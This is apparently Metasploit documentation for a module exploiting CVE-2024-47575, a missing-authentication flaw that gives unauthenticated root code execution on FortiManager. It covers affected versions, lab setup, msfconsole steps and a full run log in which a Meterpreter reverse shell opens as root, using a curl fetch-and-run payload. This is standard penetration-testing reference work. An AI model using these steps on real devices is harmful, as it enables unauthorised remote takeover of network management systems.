## Vulnerable Application
This module exploits a missing authentication vulnerability affecting FortiManager and FortiManager
Cloud devices to achieve unauthenticated RCE with root privileges.

For a full technical analysis, please see our
AttackerKB [Rapid7 Analysis](https://attackerkb.com/topics/OFBGprmpIE/cve-2024-47575/rapid7-analysis).

The vulnerable FortiManager versions are:
* 7.6.0
* 7.4.0 through 7.4.4
* 7.2.0 through 7.2.7
* 7.0.0 through 7.0.12
* 6.4.0 through 6.4.14
* 6.2.0 through 6.2.12

The vulnerable FortiManager Cloud versions are:
* 7.4.1 through 7.4.4
* 7.2.1 through 7.2.7
* 7.0.1 through 7.0.12
* 6.4 (all versions).

## Testing
You will need to acquire a firmware image for a suitable version of FortiManager. For example, to deploy FortiManager
`7.6.0` as a VM on HyperV, download the file `FMG_VM64_HV-v7.6.0.F-build3340-FORTINET.out.hyperv.zip`.
* Extract the contents of this archive. You will get a primary hard drive image `fmg.vhd`.
* In HyperV:
  * Create a new virtual machine with 4096 MB RAM and 1 vCPU.
  * Add 4 network adapters, the first must be connected to your external network (or similar) which can assigned an IP
via DHCP. The remaining 3 adapters can remain unconnected.
  * In the IDE controller, add a new hard drive and select the `fmg.vhd` image.
  * In the IDE controller, add a new hard drive and create an empty image (128GB). This is used by the device to store
data after setup.
  * Boot the machine.
* The console will display the FortiManager boot sequence and drop you to a login prompt. The default username is `admin`
and the default password is empty. After you log in as admin the first time, you will be instructed to set a new admin
password.
* After logging in, you will be dropped to a CLI shell. Run the command `get system interface port1` in order to
discover the IP address of your new FortiManager device.
* At this point you can successfully exploit an unlicensed FortiManager device. Alternatively you can acquire a trial
license of FortiManager and complete the setup by visiting `https://<FORTIMANAGER_IP>/` in your browser.

## Verification Steps

1. Start msfconsole
2. `use exploit/linux/misc/fortimanager_rce_cve_2024_47575`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set LHOST eth0`
5. `set LPORT 4444`
6. `set PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp`
7. `check`
8. `exploit`

## Options
The exploit provides a suitable client certificate/key pair by default, however we can let a user configure
a different certificate/key pair to use if they want. The user can also override the serial number and
platform if needed, but the exploit will try to detect the serial number and platform from the certificate
by default.

### ClientCert
A file path to an x509 cert, signed by Fortinet, with a serial number in the CN

### ClientKey
A file path to the corresponding private key for the ClientCert.

### ClientSerialNumber
If set, use this serial number instead of extracting one from the ClientCert.

### ClientPlatform
If set, use this platform instead of determining the platform at runtime.

## Scenarios

### Default

```
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > set RHOST 192.168.86.93
RHOST => 192.168.86.93
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > set LHOST eth0
LHOST => eth0
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > set LPORT 4444
LPORT => 4444
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > set PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > show options

Module options (exploit/linux/misc/fortimanager_rce_cve_2024_47575):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   ClientCert                           no        A file path to an x509 cert, signed by Fortinet, with a serial number in the CN
   ClientKey                            no        A file path to the corresponding private key for the ClientCert.
   ClientPlatform                       no        If set, use this platform instead of determining the platform at runtime.
   ClientSerialNumber                   no        If set, use this serial number instead of extracting one from the ClientCert.
   RHOSTS              192.168.86.93    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                                  metasploit.html
   RPORT               541              yes       The target port (TCP)


Payload options (cmd/linux/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      GfogzcPTWbTb     no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > check
[*] 192.168.86.93:541 - The service is running, but could not be validated. Detected Fortinet FortiManager
msf6 exploit(linux/misc/fortimanager_rce_cve_2024_47575) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] 192.168.86.93:541 - Client certificate common name: FMG-VM0000000000
[*] 192.168.86.93:541 - Using client serial number 'FMG-VM0000000000' and platform 'FortiManager-VM64'.
[*] 192.168.86.93:541 - Connecting...
[*] 192.168.86.93:541 - Registering device...
[*] 192.168.86.93:541 - Creating channel...
[*] 192.168.86.93:541 - Triggering...
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.93:16620) at 2024-11-15 12:48:15 +0000

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.86.93
OS           :  (Linux 5.15.109)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```
